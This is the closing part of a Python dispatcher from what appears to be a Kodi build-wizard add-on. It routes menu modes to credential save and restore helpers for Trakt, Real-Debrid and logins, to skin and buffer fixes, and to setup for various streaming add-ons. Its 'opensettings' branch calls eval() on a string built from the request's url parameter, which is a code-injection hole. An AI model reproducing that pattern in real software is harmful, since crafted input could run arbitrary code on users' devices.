elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5599
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5600
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5601
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5602
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5603
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5604
elif mode =='realdebrid':realMenu ()#line:5606
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5607
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5608
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5609
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5610
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5611
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5612
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5613
elif mode =='login':loginMenu ()#line:5615
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5616
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5617
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5618
elif mode =='clearlogin':loginit .clearSaved (name )#line:5619
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5620
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5621
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5622
elif mode =='contact':notify .contact (CONTACT )#line:5624
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5625
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5626
elif mode =='developer':developer ()#line:5628
elif mode =='converttext':wiz .convertText ()#line:5629
elif mode =='createqr':wiz .createQR ()#line:5630
elif mode =='testnotify':testnotify ()#line:5631
elif mode =='testnotify2':testnotify2 ()#line:5632
elif mode =='servicemanual':servicemanual ()#line:5633
elif mode =='fastinstall':fastinstall ()#line:5634
elif mode =='testupdate':testupdate ()#line:5635
elif mode =='testfirst':testfirst ()#line:5636
elif mode =='testfirstrun':testfirstRun ()#line:5637
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5638
elif mode =='bg':wiz .bg_install (name ,url )#line:5640
elif mode =='bgcustom':wiz .bg_custom ()#line:5641
elif mode =='bgremove':wiz .bg_remove ()#line:5642
elif mode =='bgdefault':wiz .bg_default ()#line:5643
elif mode =='rdset':rdsetup ()#line:5644
elif mode =='mor':morsetup ()#line:5645
elif mode =='mor2':morsetup2 ()#line:5646
elif mode =='resolveurl':resolveurlsetup ()#line:5647
elif mode =='urlresolver':urlresolversetup ()#line:5648
elif mode =='forcefastupdate':forcefastupdate ()#line:5649
elif mode =='traktset':traktsetup ()#line:5650
elif mode =='placentaset':placentasetup ()#line:5651
elif mode =='flixnetset':flixnetsetup ()#line:5652
elif mode =='reptiliaset':reptiliasetup ()#line:5653
elif mode =='yodasset':yodasetup ()#line:5654
elif mode =='numbersset':numberssetup ()#line:5655
elif mode =='uranusset':uranussetup ()#line:5656
elif mode =='genesisset':genesissetup ()#line:5657
elif mode =='fastupdate':fastupdate ()#line:5658
elif mode =='folderback':folderback ()#line:5659
elif mode =='menudata':Menu ()#line:5660
elif mode ==2 :#line:5662
        wiz .torent_menu ()#line:5663
elif mode ==3 :#line:5664
        wiz .popcorn_menu ()#line:5665
elif mode ==8 :#line:5666
        wiz .metaliq_fix ()#line:5667
elif mode ==9 :#line:5668
        wiz .quasar_menu ()#line:5669
elif mode ==5 :#line:5670
        swapSkins ('skin.Premium.mod')#line:5671
elif mode ==13 :#line:5672
        wiz .elementum_menu ()#line:5673
elif mode ==16 :#line:5674
        wiz .fix_wizard ()#line:5675
elif mode ==17 :#line:5676
        wiz .last_play ()#line:5677
elif mode ==18 :#line:5678
        wiz .normal_metalliq ()#line:5679
elif mode ==19 :#line:5680
        wiz .fast_metalliq ()#line:5681
elif mode ==20 :#line:5682
        wiz .fix_buffer2 ()#line:5683
elif mode ==21 :#line:5684
        wiz .fix_buffer3 ()#line:5685
elif mode ==11 :#line:5686
        wiz .fix_buffer ()#line:5687
elif mode ==15 :#line:5688
        wiz .fix_font ()#line:5689
elif mode ==14 :#line:5690
        wiz .clean_pass ()#line:5691
elif mode ==22 :#line:5692
        wiz .movie_update ()#line:5693
elif mode =='adv_settings':buffer1 ()#line:5694
elif mode =='getpass':getpass ()#line:5695
elif mode =='setpass':setpass ()#line:5696
elif mode =='setuname':setuname ()#line:5697
elif mode =='passandUsername':passandUsername ()#line:5698
elif mode =='9':disply_hwr ()#line:5699
elif mode =='99':disply_hwr2 ()#line:5700
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))